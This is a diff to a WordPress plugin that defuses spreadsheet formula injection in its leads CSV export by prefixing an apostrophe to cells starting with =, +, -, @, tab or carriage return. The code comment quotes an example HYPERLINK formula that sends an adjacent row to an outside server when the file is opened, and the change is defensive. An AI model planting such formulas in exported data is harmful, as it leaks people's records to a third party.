@@ -516,6 +516,31 @@ class Thallo_Vis_Leads {
 		return $wpdb->get_results( $wpdb->prepare( "SELECT * FROM $table ORDER BY created_at DESC LIMIT %d", $limit ), ARRAY_A );
 	}
 
+	/**
+	 * A cell, defused.
+	 *
+	 * Excel, Numbers and Sheets read a cell beginning `=`, `+`, `-` or `@`
+	 * as a formula and run it on open. Every column in this export except the
+	 * date came from a stranger filling in the scan form, so a brand name of
+	 * `=HYPERLINK("https://…"&A1,"Open")` is a link that posts the row beside
+	 * it to somebody else's server the moment the file is opened — and the
+	 * file being opened is the entire point of exporting it.
+	 *
+	 * A leading apostrophe is the spreadsheet's own "this is text". It is not
+	 * shown in the cell and it does not travel back into the database; the
+	 * only thing it costs is a stray quote if the file is read as raw text.
+	 */
+	private static function csv_cell( $value ) {
+		$value = (string) $value;
+
+		if ( '' === $value ) {
+			return $value;
+		}
+
+		// Tab and carriage return count: both let the next character start the cell.
+		return false !== strpos( "=+-@\t\r", $value[0] ) ? "'" . $value : $value;
+	}
+
 	public static function export_csv() {
 		if ( ! current_user_can( 'manage_options' ) ) {
 			wp_die( esc_html__( 'You do not have permission to export leads.', 'thallo-visibility' ) );
@@ -537,7 +562,7 @@ class Thallo_Vis_Leads {
 		fputcsv( $out, array( 'Date (UTC)', 'Email', 'Brand', 'Website', 'Category', 'Share of voice %', 'Grade', 'Report email' ) );
 
 		foreach ( (array) $rows as $row ) {
-			fputcsv( $out, $row );
+			fputcsv( $out, array_map( array( __CLASS__, 'csv_cell' ), (array) $row ) );
 		}
 
 		fclose( $out );
